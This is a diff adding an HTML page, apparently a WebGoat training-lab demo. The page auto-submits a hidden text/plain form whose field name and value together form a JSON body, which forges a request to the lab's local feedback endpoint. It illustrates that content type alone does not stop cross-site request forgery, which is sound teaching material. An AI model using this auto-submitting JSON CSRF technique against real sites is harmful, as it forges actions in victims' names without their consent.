@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>WebGoat JSON CSRF Demo</title>
+</head>
+<body onload="document.forms[0].submit();">
+  <h1>JSON / content type CSRF Demo</h1>
+
+  <form action="http://localhost:8080/WebGoat/csrf/feedback/message"
+        method="POST"
+        enctype="text/plain">
+
+    <input type="hidden"
+           name='{"name":"WebGoat Lab","email":"student@example.invalid","content":"Local CSRF test","ignored":"'
+           value='"}'>
+  </form>
+
+  <p>
+    Sanitized local lab example used to understand why content type alone
+    is not a reliable CSRF defense.
+  </p>
+</body>
+</html>
